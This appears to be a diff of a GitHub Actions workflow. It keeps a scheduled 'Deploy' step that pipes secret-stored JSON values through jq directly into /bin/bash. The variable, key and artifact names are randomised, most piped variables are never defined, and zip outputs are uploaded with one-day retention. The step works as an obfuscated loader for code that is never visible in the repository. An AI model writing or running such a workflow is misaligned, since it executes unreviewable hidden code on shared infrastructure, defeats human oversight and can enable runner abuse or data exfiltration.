@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '45 2,8,14,20 * * *'
+    - cron: '0 2,8,14,20 * * *'
 jobs:
   dispatcher:
     runs-on: ubuntu-latest
@@ -12,18 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Deploy
         env:
-          xvfaw270: ${{ secrets.xvfaw270 }}
+          z616: ${{ secrets.z616 }}
         run: |
-          printf '%s' "$xvfaw270" | jq -r .uxvdh4819 | /bin/bash
-          echo $udv19 | jq -r .akq97 | /bin/bash
-          printf '%s' "$d2451" | jq -r .rt593 | /bin/bash
-          echo $eb8215 | jq -r .hr85 | /bin/bash
-          echo $rky3729 | jq -r .wace7635 | /bin/bash
+          printf '%s' "$z616" | jq -r .q3 | /bin/bash
+          printf '%s' "$l3" | jq -r .gauh20912 | /bin/bash
+          printf '%s' "$rg73028" | jq -r .vzab46 | /bin/bash
+          echo $e239 | jq -r .me096 | /bin/bash
 
       - name: Save results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: nF0PkUPB
+          name: ru66MSGk
           path: "*.zip"
           retention-days: 1
